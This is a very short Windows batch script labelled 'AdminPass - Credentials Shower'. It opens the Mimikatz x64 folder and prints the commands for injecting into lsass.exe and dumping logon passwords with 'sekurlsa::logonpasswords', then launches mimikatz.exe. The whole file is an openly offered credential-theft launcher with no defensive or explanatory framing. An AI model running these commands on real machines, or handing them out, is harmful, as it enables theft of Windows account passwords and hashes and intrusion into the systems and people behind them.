@echo off
title AdminPass - Credentials Shower
cd MimiKatz
cd x64
echo [+] To view passwords type "inject::process lsass.exe sekurlsa.dll" and new type "sekurlsa::logonpasswords"
pause
mimikatz.exe
